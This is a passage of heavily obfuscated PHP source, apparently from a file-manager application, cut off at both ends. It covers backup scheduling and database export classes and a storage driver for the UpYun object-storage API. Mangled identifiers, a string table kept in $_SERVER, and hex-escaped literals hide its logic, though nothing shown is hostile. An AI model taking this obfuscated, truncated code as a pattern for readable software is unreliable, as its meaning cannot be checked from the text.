(isset($‹ç­Ş­[$¢ş‰¬÷[336]][$¢ş‰¬÷[213]][$¢ş‰¬÷[508]])) { $Îæ¥ÏşÂ = (int) $‹ç­Ş­[$¢ş‰¬÷[336]][$¢ş‰¬÷[213]][$¢ş‰¬÷[508]]; } if (self::$manual == 0 && $‹ç­Ş­[$¢ş‰¬÷[32]] == self::$name) { Model($¢ş‰¬÷[771])->remove($‹ç­Ş­[$¢ş‰¬÷[442]]); } $‹ç­Ş­ = $this->initData($Îæ¥ÏşÂ, $‹ç­Ş­[$¢ş‰¬÷[773]]); } else { $this->checkStore($‹ç­Ş­[$¢ş‰¬÷[773]]); } } self::$option = $‹ç­Ş­; } private function isManual() { $‘ıº¾»Ğ = _get($GLOBALS, $_SERVER[”ôÑ§ì¸][774], 0); $‘ıº¾»Ğ = intval($‘ıº¾»Ğ); self::$manual = $‘ıº¾»Ğ && $‘ıº¾»Ğ == 1 ? 1 : 0; } private function initData($ëÀ¾õÃì = 0, $Ÿ­ğÄÅ = '') { $Ï½¡°Âï =& $_SERVER[”ôÑ§ì¸]; $ËÌµÁ = Model($Ï½¡°Âï[771])->config(); if ($Ÿ­ğÄÅ && $ËÌµÁ[$Ï½¡°Âï[773]] != $Ÿ­ğÄÅ) { $ëÀ¾õÃì = 0; } $this->checkStore($ËÌµÁ[$Ï½¡°Âï[773]]); if (self::$manual == 1) { self::$name .= $Ï½¡°Âï[11] . date($Ï½¡°Âï[775]); } $ËĞ¤§‹Ì = array($Ï½¡°Âï[773] => $ËÌµÁ[$Ï½¡°Âï[773]], $Ï½¡°Âï[32] => self::$name, $Ï½¡°Âï[772] => 0, $Ï½¡°Âï[776] => $ËÌµÁ[$Ï½¡°Âï[776]], $Ï½¡°Âï[777] => self::$manual, $Ï½¡°Âï[336] => array($Ï½¡°Âï[778] => array($Ï½¡°Âï[772] => 0), $Ï½¡°Âï[779] => array($Ï½¡°Âï[772] => 0, $Ï½¡°Âï[780] => 0, $Ï½¡°Âï[781] => 0, $Ï½¡°Âï[33] => $Ï½¡°Âï[12], $Ï½¡°Âï[782] => 0, $Ï½¡°Âï[783] => 0), $Ï½¡°Âï[784] => array($Ï½¡°Âï[772] => 0, $Ï½¡°Âï[780] => 0, $Ï½¡°Âï[781] => 0, $Ï½¡°Âï[782] => 0, $Ï½¡°Âï[783] => 0), $Ï½¡°Âï[213] => array($Ï½¡°Âï[772] => 0, $Ï½¡°Âï[785] => 0, $Ï½¡°Âï[786] => 0, $Ï½¡°Âï[787] => 0, $Ï½¡°Âï[788] => 0, $Ï½¡°Âï[508] => $ëÀ¾õÃì, $Ï½¡°Âï[782] => 0, $Ï½¡°Âï[783] => 0)), $Ï½¡°Âï[782] => time(), $Ï½¡°Âï[783] => 0); $±¿åëŞê = Model($Ï½¡°Âï[771])->insert($ËĞ¤§‹Ì); $ËĞ¤§‹Ì[$Ï½¡°Âï[442]] = $±¿åëŞê; return $ËĞ¤§‹Ì; } private function checkStore($Õ”Æ¥‹‡) { $§¡ÇĞ³Û =& $_SERVER[”ôÑ§ì¸]; $°“¢½İ¾ = Model($§¡ÇĞ³Û[789])->listData($Õ”Æ¥‹‡); Model($§¡ÇĞ³Û[789])->checkConfig($°“¢½İ¾); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[”ôÑ§ì¸][771])->findByName(self::$name); } return self::$option; } public static function set($¬»¾í–) { $ëªğ¥¥Ü =& $_SERVER[”ôÑ§ì¸]; $Ó©œ÷úô = self::get(); foreach ($¬»¾í– as $º¬ë†¹ => $¾š™¶×º) { $Âé€Èû‹ = explode($ëªğ¥¥Ü[10], $º¬ë†¹); $ÃÄ»äÖ = count($Âé€Èû‹); switch ($ÃÄ»äÖ) { case 1: $Ó©œ÷úô[$Âé€Èû‹[0]] = $¾š™¶×º; break; case 2: $Ó©œ÷úô[$Âé€Èû‹[0]][$Âé€Èû‹[1]] = $¾š™¶×º; break; case 3: $Ó©œ÷úô[$Âé€Èû‹[0]][$Âé€Èû‹[1]][$Âé€Èû‹[2]] = $¾š™¶×º; break; } } Model($ëªğ¥¥Ü[771])->update($Ó©œ÷úô[$ëªğ¥¥Ü[442]], $Ó©œ÷úô); self::$option = $Ó©œ÷úô; return self::$option; } public function keep() { $ÛÆªá¼Ë =& $_SERVER[”ôÑ§ì¸]; $Ô“‰¼¢÷ = self::get(); if ($Ô“‰¼¢÷[$ÛÆªá¼Ë[336]][$ÛÆªá¼Ë[778]][$ÛÆªá¼Ë[772]] == $ÛÆªá¼Ë[88]) { return; } $this->backupKeep($Ô“‰¼¢÷); self::set(array($ÛÆªá¼Ë[790] => 1)); } private function backupKeep($ü‰ßğæ¬) { $ŸÏö›¯¸ =& $_SERVER[”ôÑ§ì¸]; if (self::$manual == 1) { return; } $û‰÷Ğú” = Model($ŸÏö›¯¸[771])->listData(); if (empty($û‰÷Ğú”)) { return; } $¥’õ‘›É = 0; $Šäè—Ç = array(); foreach ($û‰÷Ğú” as $›ß¶ßÜ) { if ($¥’õ‘›É >= 7) { break; } $Šäè—Ç[] = $›ß¶ßÜ[$ŸÏö›¯¸[32]]; $¥’õ‘›É++; } for ($¥’õ‘›É = 0; $¥’õ‘›É < 12; $¥’õ‘›É++) { $Šäè—Ç[] = date($ŸÏö›¯¸[791], strtotime("\55{$¥’õ‘›É}\x20\x6d\x6f\156\164\x68\163")); } $Šäè—Ç = array_unique($Šäè—Ç); $–Ö úÎû = Model($ŸÏö›¯¸[792])->get($ŸÏö›¯¸[793]); foreach ($û‰÷Ğú” as $›ß¶ßÜ) { if (isset($›ß¶ßÜ[$ŸÏö›¯¸[777]]) && $›ß¶ßÜ[$ŸÏö›¯¸[777]] == $ŸÏö›¯¸[88]) { continue; } if (!empty($›ß¶ßÜ[$ŸÏö›¯¸[32]]) && in_array($›ß¶ßÜ[$ŸÏö›¯¸[32]], $Šäè—Ç)) { continue; } Model($ŸÏö›¯¸[771])->remove($›ß¶ßÜ[$ŸÏö›¯¸[442]]); $ÑâæËš = $this->backupPath($ü‰ßğæ¬, $–Ö úÎû); IO::remove($ÑâæËš, !1); } } private function backupPath($ñºÕã­é, $ó’àÜË• = false) { $¾Ş‹²é =& $_SERVER[”ôÑ§ì¸]; if (!$ó’àÜË•) { $ó’àÜË• = Model($¾Ş‹²é[792])->get($¾Ş‹²é[793]); } $™•í¸½Â = $ñºÕã­é[$¾Ş‹²é[32]]; $ˆ›Ê¥„ı = substr(md5($¾Ş‹²é[794] . $ó’àÜË• . $™•í¸½Â), 0, 8); return "\173\x69\x6f\x3a{$ñºÕã­é[$¾Ş‹²é[773]]}\x7d\x2f\x64\x61\164\x61\x62\141\163\145\x2f\x62\x61\x63\x6b\x75\160\57" . $™•í¸½Â . $¾Ş‹²é[11] . $ˆ›Ê¥„ı; } public function db() { $ìéÁÒö =& $_SERVER[”ôÑ§ì¸]; $É¹¥õù² = self::get(); if ($É¹¥õù²[$ìéÁÒö[336]][$ìéÁÒö[779]][$ìéÁÒö[772]] == $ìéÁÒö[88]) { return !0; } $õ§ø¶À÷ = new BackupDb(); if (!$õ§ø¶À÷->index()) { return !1; } self::set(array($ìéÁÒö[795] => 1)); return !0; } public function dbFile() { $›ÎÔ°‰¯ =& $_SERVER[”ôÑ§ì¸]; $ğİ‘üİ = self::get(); if ($ğİ‘üİ[$›ÎÔ°‰¯[336]][$›ÎÔ°‰¯[784]][$›ÎÔ°‰¯[772]] == $›ÎÔ°‰¯[88]) { return !0; } $ÌüÄÁ¨ô = new BackupDbFile(); if (!$ÌüÄÁ¨ô->index()) { return !1; } self::set(array($›ÎÔ°‰¯[796] => 1)); return !0; } public function file() { $·€ßÕ¤Ä =& $_SERVER[”ôÑ§ì¸]; $ŸŒŞ–ïğ = self::get(); if ($ŸŒŞ–ïğ[$·€ßÕ¤Ä[336]][$·€ßÕ¤Ä[213]][$·€ßÕ¤Ä[772]] == $·€ßÕ¤Ä[88]) { return !0; } if (!isset($ŸŒŞ–ïğ[$·€ßÕ¤Ä[776]]) || $ŸŒŞ–ïğ[$·€ßÕ¤Ä[776]] == $·€ßÕ¤Ä[211]) { $í­Ùõš = new BackupFile(); if (!$í­Ùõš->index()) { return !1; } } self::set(array($·€ßÕ¤Ä[797] => 1, $·€ßÕ¤Ä[772] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ï¥³—«» =& $_SERVER[”ôÑ§ì¸]; $ûß¯½ë = Backup::get(); self::$io = $ûß¯½ë[$Ï¥³—«»[773]]; self::$name = $ûß¯½ë[$Ï¥³—«»[32]]; $ÒŠ»Ğ·Œ = new DbManage(); $ù›Ş¡ÛØ = $ÒŠ»Ğ·Œ->dbType(); $•º¬Ÿ»— = array($Ï¥³—«»[798] => $ù›Ş¡ÛØ, $Ï¥³—«»[799] => time()); Backup::set($•º¬Ÿ»—); $Ó¢æÆ´Ë = $this->tmpFilesPath() . $Ï¥³—«»[800] . self::$name . $Ï¥³—«»[8]; del_dir($Ó¢æÆ´Ë); mk_dir($Ó¢æÆ´Ë); $¨ƒŒĞ–÷ = $˜ö»ç¸ğ = 0; $„µÌ»´é = new Task($Ï¥³—«»[801], $Ï¥³—«»[802], 0, LNG($Ï¥³—«»[803]) . $Ï¥³—«»[804] . LNG($Ï¥³—«»[805])); try { $ù¨Äı— = $ÒŠ»Ğ·Œ->db()->getTables(); } catch (Exception $ı‘¸ğ¬) { $„µÌ»´é->end(); return !1; } $ù¨Äı— = array_diff($ù¨Äı—, array($Ï¥³—«»[806], $Ï¥³—«»[807])); foreach ($ù¨Äı— as $ééŒŠÑÇ) { $¨ƒŒĞ–÷ += $ÒŠ»Ğ·Œ->model($ééŒŠÑÇ)->count(); } $„µÌ»´é->task[$Ï¥³—«»[808]] = $¨ƒŒĞ–÷; $GLOBALS[$Ï¥³—«»[809]] = self::$name; foreach ($ù¨Äı— as $ééŒŠÑÇ) { $Ç—Øãõ = $Ó¢æÆ´Ë . $ééŒŠÑÇ . $Ï¥³—«»[810]; $ğóÒŒ¾ï = null; if ($ééŒŠÑÇ == $Ï¥³—«»[811] && (!isset($ûß¯½ë[$Ï¥³—«»[776]]) || $ûß¯½ë[$Ï¥³—«»[776]] == $Ï¥³—«»[211])) { $ğóÒŒ¾ï = self::$io; } $˜ö»ç¸ğ += $ÒŠ»Ğ·Œ->sqlFromDb($ééŒŠÑÇ, $Ç—Øãõ, $„µÌ»´é, $ğóÒŒ¾ï); } unset($GLOBALS[$Ï¥³—«»[809]]); $„µÌ»´é->end(); if ($˜ö»ç¸ğ > $¨ƒŒĞ–÷) { $¨ƒŒĞ–÷ = $˜ö»ç¸ğ; } $•º¬Ÿ»— = array($Ï¥³—«»[798] => $ù›Ş¡ÛØ, $Ï¥³—«»[795] => 1, $Ï¥³—«»[812] => $¨ƒŒĞ–÷, $Ï¥³—«»[813] => $˜ö»ç¸ğ, $Ï¥³—«»[814] => time()); Backup::set($•º¬Ÿ»—); if ($¨ƒŒĞ–÷ - $˜ö»ç¸ğ > 0) { $–ŞŠ¬ĞÒ = $Ï¥³—«»[815]; if (stristr(I18n::getType(), $Ï¥³—«»[816])) { $–ŞŠ¬ĞÒ = $Ï¥³—«»[817]; } write_log(array($–ŞŠ¬ĞÒ, $•º¬Ÿ»—), $Ï¥³—«»[802]); return !1; } return !0; } private function tmpFilesPath() { $«‡¡Ë¤§ =& $_SERVER[”ôÑ§ì¸]; $©ÇÊ²Ë¦ = TEMP_FILES; if ($GLOBALS[$«‡¡Ë¤§[6]][$«‡¡Ë¤§[89]][$«‡¡Ë¤§[818]]) { $©ÇÊ²Ë¦ = $GLOBALS[$«‡¡Ë¤§[6]][$«‡¡Ë¤§[89]][$«‡¡Ë¤§[818]]; if (!mk_dir($©ÇÊ²Ë¦) || !is_writable($©ÇÊ²Ë¦) || !IO::mkfile($©ÇÊ²Ë¦ . $«‡¡Ë¤§[819])) { $©ÇÊ²Ë¦ = TEMP_FILES; } } return $©ÇÊ²Ë¦; } } goto EÆç…¬·Ãí; E†±¸ĞñòÍ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ù´™ÄäŞ, $ÍíøÃ€à = 0) { parent::__construct(); $this->source = $ù´™ÄäŞ; $this->sourceSize = $ÍíøÃ€à; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($„åÁ¾‡ö = false) { return $this->sourceSize; } public function getContent($ô™¹Â»³ = false) { return $this->fileSubstr($ô™¹Â»³, 0, $this->sourceSize); } public function fileSubstr($ªñÀÆ•ï = false, $Æ÷†îÁ = 0, $­æêÂ•¬ = 0) { if (!$­æêÂ•¬) { $­æêÂ•¬ = $this->sourceSize; } $Ûü°Æˆ¥ = $this->sourceSize - $Æ÷†îÁ; if ($­æêÂ•¬ >= $Ûü°Æˆ¥) { $­æêÂ•¬ = $Ûü°Æˆ¥; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Æ÷†îÁ, $­æêÂ•¬); } if ($this->sourceType == self::TYPE_FILE) { if ($­æêÂ•¬ <= 0) { return $_SERVER[”ôÑ§ì¸][12]; } $ùÌ½•ñŸ = ftell($this->source); fseek_64($this->source, $ùÌ½•ñŸ + $Æ÷†îÁ); $ê§›‰İ‘ = @fread($this->source, $­æêÂ•¬); fseek_64($this->source, $ùÌ½•ñŸ); return $ê§›‰İ‘; } } public function hashMd5($ì±Ø·şè = false) { return md5($this->getContent()); } public static function hash($³ÖŞ‡¤³, $ù•éõíç = 0) { $‡û‰ãÉ  = new PathDriverStream($³ÖŞ‡¤³, $ù•éõíç); return $‡û‰ãÉ ->hashSimple($³ÖŞ‡¤³); } public static function md5($„ğÒúá¶, $Ô òÓÌ = 0) { $›œ¦Œ›Í = new PathDriverStream($„ğÒúá¶, $Ô òÓÌ); return $›œ¦Œ›Í->hashMd5($„ğÒúá¶); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\57\x2f\166\x30\x2e\141\x70\151\56\x75\160\171\165\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($£ÇÕÎ©) { parent::__construct(); $this->_init($£ÇÕÎ©); } public function _init($öôÑíÙ) { $Ó»ºö´ =& $_SERVER[”ôÑ§ì¸]; foreach ($öôÑíÙ as $·Ü’¯›¬ => $³Ë÷ùŒ±) { if (isset($this->{$·Ü’¯›¬})) { $this->{$·Ü’¯›¬} = $³Ë÷ùŒ±; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ó»ºö´[1468] . LNG($Ó»ºö´[1399])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ ­ ¼÷è, $á™÷‰”² = "\x47\x45\124") { $ÎËÁƒÄŸ =& $_SERVER[”ôÑ§ì¸]; $„ƒÜàıå = gmdate($ÎËÁƒÄŸ[1432]); $Ÿ ³¤ = base64_encode(hash_hmac($ÎËÁƒÄŸ[1469], "{$á™÷‰”²}\x26{$ ­ ¼÷è}\46{$„ƒÜàıå}", md5("{$this->userpass}"), !0)); $µèµŞ½½ = array("\101\165\x74\150\157\162\x69\x7a\x61\164\151\x6f\x6e\x3a\x55\x50\131\x55\116\x20{$this->username}\x3a{$Ÿ ³¤}", "\x44\x61\164\145\72{$„ƒÜàıå}"); return $µèµŞ½½; } public function ussRequest($…Ä•ªí¼, $â‘ ÍÛ¯ = "\x47\x45\x54", $†óá¤ú = false, $ÂŒ°Ïë = false, $õ¨£½ë = false) { $•€­İÚ– =& $_SERVER[”ôÑ§ì¸]; $…Ä•ªí¼ = trim($…Ä•ªí¼, $•€­İÚ–[8]); $íˆîÇ½÷ = "\57{$this->bucket}\x2f{$…Ä•ªí¼}"; $ûñã³— = $this->ussHeaders($íˆîÇ½÷, $â‘ ÍÛ¯); if ($ÂŒ°Ïë) { $ûñã³— = array_merge($ûñã³—, $ÂŒ°Ïë); } $±Ú…¯Ïş = url_request($this->endpoint . $íˆîÇ½÷, $â‘ ÍÛ¯, $†óá¤ú, $ûñã³—, $õ¨£½ë); if (!$±Ú…¯Ïş) { return array($•€­İÚ–[1243] => !1, $•€­İÚ–[1233] => $•€­İÚ–[1470]); } if (strtolower($â‘ ÍÛ¯) == $•€­İÚ–[210] || in_array($±Ú…¯Ïş[$•€­İÚ–[1243]], array($•€­İÚ–[256], $•€­İÚ–[1471]))) { $†óá¤ú = $±Ú…¯Ïş[$•€­İÚ–[1472]]; } else { $†óá¤ú = json_decode($±Ú…¯Ïş[$•€­İÚ–[1233]], !0); if (!$†óá¤ú) { $†óá¤ú = $±Ú…¯Ïş[$•€­İÚ–[1233]]; } else { if (!$±Ú…¯Ïş[$•€­İÚ–[772]] && isset($†óá¤ú[$•€­İÚ–[1473]])) { $†óá¤ú = $†óá¤ú[$•€­İÚ–[1473]]; } } } return array($•€­İÚ–[1243] => $±Ú…¯Ïş[$•€­İÚ–[772]], $•€­İÚ–[1233] => $†óá¤ú); } public function mkfile($¼ÎçşÆ, $ªàÚ¸ = '', $ÏùÜã„ø = REPEAT_RENAME) { if ($this->setContent($¼ÎçşÆ, $ªàÚ¸)) { return $this->getPathOuter($¼ÎçşÆ); } return !1; } public function mkdir($Ö¬«ãÇà, $€èÇšìš = REPEAT_SKIP) { $é•Á×Ù =& $_SERVER[”ôÑ§ì¸]; $®¡ŠçŸ = trim($Ö¬«ãÇà, $é•Á×Ù[8]); if ($this->_isFolder($®¡ŠçŸ)) { return $this->getPathOuter($®¡ŠçŸ); } $™Ğ˜­ü = array($é•Á×Ù[1474]); $ú½ê¬‘Í = $this->ussRequest($®¡ŠçŸ, $é•Á×Ù[240], !1, $™Ğ˜­ü); return $ú½ê¬‘Í[$é•Á×Ù[1243]] ? $this->getPathOuter($®¡ŠçŸ) : !1; } public function copyFile($Âğ¾Ğ‹, $“¸­¶˜ğ) { $ÃÁø¡í =& $_SERVER[”ôÑ§ì¸]; $ÚõöÏá” = array($ÃÁø¡í[1475] . "\57{$this->bucket}\57{$Âğ¾Ğ‹}", $ÃÁø¡í[1476]); $‹½€Îá” = $this->ussRequest($“¸­¶˜ğ, $ÃÁø¡í[242], !1, $ÚõöÏá”); return $‹½€Îá”[$ÃÁø¡í[1243]] ? !0 : $this->getPathOuter($“¸­¶˜ğ); } public function moveFile($¶¤¬î’‘, $À·ùˆä) { $ë„·ó½¶ =& $_SERVER[”ôÑ§ì¸]; $ÕÛÒŒÎ± = array($ë„·ó½¶[1477] . "\x2f{$this->bucket}\x2f{$¶¤¬î’‘}", $ë„·ó½¶[1476]); $ÎÕÓšÖ¥ = $this->ussRequest($À·ùˆä, $ë„·ó½¶[242], !1, $ÕÛÒŒÎ±); return $ÎÕÓšÖ¥[$ë„·ó½¶[1243]] ? !0 : $this->getPathOuter($À·ùˆä); } public function delFile($ÀÀõå¹î) { $“ÑÌÄò =& $_SERVER[”ôÑ§ì¸]; $ˆ¾ò¦“ş = $this->ussRequest($ÀÀõå¹î, $“ÑÌÄò[1478]); return $ˆ¾ò¦“ş[$“ÑÌÄò[1243]] ? !0 : !1; } public function delFolder($³Æ¾Ûê´) { $‹ÀÖã§‚ =& $_SERVER[”ôÑ§ì¸]; if (!$this->exist($³Æ¾Ûê´)) { return !0; } $this->listItemCache = !1; $ÌÂŒÜ¨ú = $ËË¤À¡ü = array(); $this->fileList($³Æ¾Ûê´, $ÌÂŒÜ¨ú, $ËË¤À¡ü, !0); $this->listItemCache = !0; foreach ($ËË¤À¡ü as $ÊÚ†»ºŸ) { $á…ì§ˆ = $this->ussRequest($ÊÚ†»ºŸ[$‹ÀÖã§‚[32]], $‹ÀÖã§‚[1478]); if (!$á…ì§ˆ[$‹ÀÖã§‚[1243]]) { return !1; } } foreach ($ÌÂŒÜ¨ú as $üÍÏÇ‚ó) { $á…ì§ˆ = $this->ussRequest($üÍÏÇ‚ó, $‹ÀÖã§‚[1478]); if (!$á…ì§ˆ[$‹ÀÖã§‚[1243]]) { return !1; } } $á…ì§ˆ = $this->ussRequest($³Æ¾Ûê´, $‹ÀÖã§‚[1478]); return $á…ì§ˆ[$‹ÀÖã§‚[1243]]; } public function rename($éâ£ìõ‘, $‚ñÚüú) { if ($this->isFile($éâ£ìõ‘)) { $‚ñÚüú = get_path_father($éâ£ìõ‘) . $‚ñÚüú; return $this->moveFile($éâ£ìõ‘, $‚ñÚüú); } return $this->renameObject($éâ£ìõ‘, $‚ñÚüú); } public function fileInfo($Ï¸½Î½ï, $É¡¥Ëûî = false, $ùÔ²°®  = array()) { $´àÙíÄâ =& $_SERVER[”ôÑ§ì¸]; $¤ºœ³ŠÔ = array($´àÙíÄâ[32] => $this->pathThis($Ï¸½Î½ï), $´àÙíÄâ[84] => $this->getPathOuter($´àÙíÄâ[8] . $Ï¸½Î½ï), $´àÙíÄâ[33] => $´àÙíÄâ[213], $´àÙíÄâ[76] => isset($ùÔ²°® [$´àÙíÄâ[76]]) ? $ùÔ²°® [$´àÙíÄâ[76]] : 0, $´àÙíÄâ[174] => $this->ext($Ï¸½Î½ï)); if ($É¡¥Ëûî) { return $¤ºœ³ŠÔ; } $¤ºœ³ŠÔ[$´àÙíÄâ[214]] = $¤ºœ³ŠÔ[$´àÙíÄâ[85]] = 0; $¤ºœ³ŠÔ[$´àÙíÄâ[215]] = $¤ºœ³ŠÔ[$´àÙíÄâ[216]] = !0; if (empty($ùÔ²°® )) { $ùÔ²°®  = $this->objectMeta($Ï¸½Î½ï); if (!$ùÔ²°® ) { return $¤ºœ³ŠÔ; } } $¤ºœ³ŠÔ[$´àÙíÄâ[214]] = intval($ùÔ²°® [$´àÙíÄâ[1479]]); $¤ºœ³ŠÔ[$´àÙíÄâ[85]] = intval($ùÔ²°® [$´àÙíÄâ[1480]]); $¤ºœ³ŠÔ[$´àÙíÄâ[76]] = $ùÔ²°® [$´àÙíÄâ[76]]; return $¤ºœ³ŠÔ; } public function folderInfo($œÕ†ğ•Ş, $µÂõ£Ì¿ = false) { $“ı¬ôõÍ =& $_SERVER[”ôÑ§ì¸]; $£’öúóü = array($“ı¬ôõÍ[32] => $this->pathThis($œÕ†ğ•Ş), $“ı¬ôõÍ[84] => $this->getPathOuter($“ı¬ôõÍ[8] . $œÕ†ğ•Ş), $“ı¬ôõÍ[33] => $“ı¬ôõÍ[75]); if ($µÂõ£Ì¿) { return $£’öúóü; } $£’öúóü[$“ı¬ôõÍ[214]] = $£’öúóü[$“ı¬ôõÍ[85]] = 0; $£’öúóü[$“ı¬ôõÍ[215]] = $£’öúóü[$“ı¬ôõÍ[216]] = !0; if (empty($÷ëŞ©û)) { $÷ëŞ©û = $this->objectMeta($œÕ†ğ•Ş); if (!$÷ëŞ©û) { return $£’öúóü; } } $£’öúóü[$“ı¬ôõÍ[214]] = intval($÷ëŞ©û[$“ı¬ôõÍ[1479]]); $£’öúóü[$“ı¬ôõÍ[85]] = intval($÷ëŞ©û[$“ı¬ôõÍ[1480]]); return $£’öúóü; } private function listObjs($Å”Õ ¡Í, $ÏÒ‹“¾ó = 0, $âŸŠƒòÂ = 1000) { $«§©Ñ„ =& $_SERVER[”ôÑ§ì¸]; $ƒ¯ôŸ²² = array($«§©Ñ„[1481], $«§©Ñ„[1482] . $âŸŠƒòÂ); if ($ÏÒ‹“¾ó) { $ƒ¯ôŸ²²[] = $«§©Ñ„[1483] . $ÏÒ‹“¾ó; } $è–ÅƒĞ = $this->ussRequest($Å”Õ ¡Í, $«§©Ñ„[244], !1, $ƒ¯ôŸ²²); return !$è–ÅƒĞ[$«§©Ñ„[1243]] ? !1 : $è–ÅƒĞ[$«§©Ñ„[1233]]; } private function fileList($Û»»ı´Œ, &$İ”×¯–, &$Ì““áùİ, $œï¹ö Ã = false) { $ê´®Ã´ =& $_SERVER[”ôÑ§ì¸]; $ù†øñÄ„ = $ê´®Ã´[12]; $ì§¶Ô’‘ = 1000; $í¾ĞæıÑ = rtrim($Û»»ı´Œ, $ê´®Ã´[8]) . $ê´®Ã´[8]; while (!0) { check_abort(); $ö°’©ß = $this->listObjs($Û»»ı´Œ, $ù†øñÄ„, $ì§¶Ô’‘); if (!$ö°’©ß) { return !1; } $ù†øñÄ„ = isset($ö°’©ß[$ê´®Ã´[1484]]) ? $ö°’©ß[$ê´®Ã´[1484]] : $ê´®Ã´[12]; $«èÏ…Çà = isset($ö°’©ß[$ê´®Ã´[1485]]) ? $ö°’©ß[$ê´®Ã´[1485]] : array(); foreach ($«èÏ…Çà as $‚Ö¸‡‚Ú) { $İû±Ëé• = $‚Ö¸‡‚Ú[$ê´®Ã´[33]] == $ê´®Ã´[75] ? !0 : !1; $¹Ğ—®ƒ = ltrim($í¾ĞæıÑ . $‚Ö¸‡‚Ú[$ê´®Ã´[32]], $ê´®Ã´[8]) . ($İû±Ëé• ? $ê´®Ã´[8] : $ê´®Ã´[12]); $¿…Ñûğ = array($ê´®Ã´[32] => $¹Ğ—®ƒ, $ê´®Ã´[33] => $İû±Ëé• ? $ê´®Ã´[75] : $ê´®Ã´[213], $ê´®Ã´[76] => $‚Ö¸‡‚Ú[$ê´®Ã´[380]], $ê´®Ã´[1480] => $‚Ö¸‡‚Ú[$ê´®Ã´[1486]]); $this->cacheMethodInfoSet($¹Ğ—®ƒ, $İû±Ëé•, $¿…Ñûğ); if ($İû±Ëé•) { $İ”×¯–[] = $¹Ğ—®ƒ; if ($œï¹ö Ã) { $this->fileList($¹Ğ—®ƒ, $İ”×¯–, $Ì““áùİ, $œï¹ö Ã); } continue; } $Ì““áùİ[] = $¿…Ñûğ; } if (count($«èÏ…Çà) < $ì§¶Ô’‘) { break; } } $this->cacheMethodInfoSet($Û»»ı´Œ, !0); } public function listPath($ÌÁÇÌ‰, $Ë²×Úê = false) { $¶å£ù³ˆ =& $_SERVER[”ôÑ§ì¸]; $ËÓ¥Şï = $®Ä•ÅÀ‡ = array(); $this->fileList($ÌÁÇÌ‰, $ËÓ¥Şï, $®Ä•ÅÀ‡); foreach ($ËÓ¥Şï as $…Ù‰œ¶Ä => $¨¢ğöÅ) { $ËÓ¥Şï[$…Ù‰œ¶Ä] = $this->folderInfo($¨¢ğöÅ, $Ë²×Úê); } foreach ($®Ä•ÅÀ‡ as $…Ù‰œ¶Ä => $¨¢ğöÅ) { $®Ä•ÅÀ‡[$…Ù‰œ¶Ä] = $this->fileInfo($¨¢ğöÅ[$¶å£ù³ˆ[32]], $Ë²×Úê, $¨¢ğöÅ); } return array($¶å£ù³ˆ[82] => $ËÓ¥Şï, $¶å£ù³ˆ[83] => $®Ä•ÅÀ‡); } public function has($ÔÎòÀÖ, $âÑê±ªÏ = false, $Ï¦¢Ô›ã = true) { $®ñáÒÕÙ =& $_SERVER[”ôÑ§ì¸]; $¨¢Åİµİ = $®ñáÒÕÙ[12]; $¸“¬«¦ = 500; $Şâ½àŞ = 0; $¸›ª”×­ = 0; $ÈßığÄŒ = rtrim($ÔÎòÀÖ, $®ñáÒÕÙ[8]) . $®ñáÒÕÙ[8]; while (!0) { check_abort(); $’Ëœİñİ = $this->listObjs($ÔÎòÀÖ, $¨¢Åİµİ, $¸“¬«¦); if (!$’Ëœİñİ) { return !1; } $¨¢Åİµİ = isset($’Ëœİñİ[$®ñáÒÕÙ[1484]]) ? $’Ëœİñİ[$®ñáÒÕÙ[1484]] : $®ñáÒÕÙ[12]; $šš˜‹¤¶ = isset($’Ëœİñİ[$®ñáÒÕÙ[1485]]) ? $’Ëœİñİ[$®ñáÒÕÙ[1485]] : array(); if (empty($šš˜‹¤¶)) { break; } $½Ú¥Â¥ë = array_filter($šš˜‹¤¶, function ($éÙıÁ¨) { $„Ç‹‘×• =& $_SERVER[”ôÑ§ì¸]; return $éÙıÁ¨[$„Ç‹‘×•[33]] == $„Ç‹‘×•[75]; }); $ŒŒÈÜ³É = count($šš˜‹¤¶); $½Ú¥Â¥ë = count($½Ú¥Â¥ë); $¯ù„Ÿµ = $ŒŒÈÜ³É - $½Ú¥Â¥ë; if ($âÑê±ªÏ) { $¸›ª”×­ += $½Ú¥Â¥ë; $Şâ½àŞ += $¯ù„Ÿµ; if ($ŒŒÈÜ³É < $¸“¬«¦) { break; } continue; } if ($Ï¦¢Ô›ã) { if ($¯ù„Ÿµ) { return !0; } } else { if ($½Ú¥Â¥ë) { return !0; } } if ($ŒŒÈÜ³É < $¸“¬«¦) { break; } } if ($âÑê±ªÏ) { return array($®ñáÒÕÙ[222] => $Şâ½àŞ, $®ñáÒÕÙ[223] => $¸›ª”×­); } return !1; } public function listAll($½æúÜ¶ö) { $òµ§®óØ =& $_SERVER[”ôÑ§ì¸]; $ÆöÎôşñ = $ƒÈ£°ª = array(); $this->fileList($½æúÜ¶ö, $ÆöÎôşñ, $ƒÈ£°ª, !0); $ÊÓ…‰£Ø = array_to_keyvalue($ƒÈ£°ª, $òµ§®óØ[32]); foreach ($ÆöÎôşñ as $…¦î¦°Ğ) { if (is_string($…¦î¦°Ğ)) { $ÊÓ…‰£Ø[$…¦î¦°Ğ] = array($òµ§®óØ[76] => 0); } } return $this->listAllFiles($½æúÜ¶ö, $ÊÓ…‰£Ø); } public function canRead($ºµêÓ×Í) { return $this->exist($ºµêÓ×Í) ? !0 : !1; } public function canWrite($ıƒ†ñùª) { return $this->exist($ıƒ†ñùª) ? !0 : !1; } public function getContent($èü”á€„) { return $this->fileSubstr($èü”á€„, 0, -1); } public function setContent($äÂ±¡Ğ, $½êØ¨å¨ = '') { $ÄàÇ– =& $_SERVER[”ôÑ§ì¸]; if (!$½êØ¨å¨) { $ü¿‹Ñ¢ = 